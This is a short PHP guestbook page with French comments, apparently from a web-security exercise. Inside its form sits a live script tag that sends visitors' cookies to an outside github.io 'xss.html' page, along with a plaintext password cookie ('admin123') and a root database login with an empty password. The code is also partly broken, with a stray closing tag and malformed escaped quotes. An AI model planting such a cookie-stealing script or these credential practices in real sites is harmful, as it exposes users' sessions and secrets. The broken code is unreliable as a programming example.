<?php

// Définir un cookie avec la valeur 'admin123'
setcookie('pwd', 'admin123', time() + 3600, '/');  // Durée de vie du cookie : 1 heure

try {
    // Connexion à la base de données
    $pdo = new PDO("mysql:host=localhost;dbname=base1", 'root', '');
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Vérifier si le formulaire a été soumis
    if (isset($_POST['ajouterMot'])) {
        // Récupérer le mot depuis le formulaire et appliquer htmlspecialchars
        $mot = htmlspecialchars($_POST['mot'], ENT_QUOTES, 'UTF-8');

        // Utiliser des requêtes préparées pour éviter les injections SQL
        $stmt = $pdo->prepare("INSERT INTO livredor (mot) VALUES (:mot)");
        $stmt->bindParam(':mot', $mot, PDO::PARAM_STR);

        // Exécuter la requête
        $stmt->execute();

        // Indiquer que le mot a été ajouté avec succès
        echo 'Mot ajouté avec succès.';
    }
} catch (PDOException $e) {
    // Gérer les erreurs de base de données
    echo "Erreur de base de données : " . $e->getMessage();
}
?>

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <?php
    $selectall = $pdo->query("SELECT * FROM livredor");
    $result = $selectall->fetchALL();
    foreach ($result as $ligne) {
        echo $ligne['mot'] . '<br>';
    }
?>

<h3> Livre d'or </h3>
<form method="post" action="#">
    Mon mot : <textarea name="mot"></textarea><br>
    <input type="submit" value="Ajouter mon mot" name="ajouterMot">
    <script>document.location=\'https://tvinchent-epsi.github.io/xss.html?cookie=\'+document.cookie</script>">
</form>
</body>
</html>
